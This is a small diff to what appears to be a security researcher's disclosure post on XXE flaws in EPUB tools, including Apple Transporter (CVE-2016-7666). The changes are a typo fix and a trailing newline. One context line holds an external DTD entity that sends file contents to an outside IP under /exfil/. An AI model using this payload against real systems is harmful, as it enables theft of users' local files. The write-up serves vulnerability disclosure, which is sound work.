@@ -124,7 +124,7 @@ External DTD specifying the file to retrive:
 <!ENTITY % c "<!ENTITY send SYSTEM 'http://123.123.123.123/exfil/%d;'>">
 {% endhighlight %}
 
-eg., Retriving secret stuff from a users Windows documents folder:
+eg., Retrieving secret stuff from a users Windows documents folder:
 ![Image](/assets/epub/ADE.png)
 
 **Apple Transporter** (underlying tool used to validate metadata and assets and deliver them to the iTunes Store), [CVE-2016-7666](https://support.apple.com/en-us/HT207432).
@@ -149,3 +149,4 @@ Thanks to [CERT/CC](http://www.cert.org/) for their help in coordinating with di
 If you got this far, thanks for reading. 👋 
 
 [@craig](https://twitter.com/craig_arendt)
+
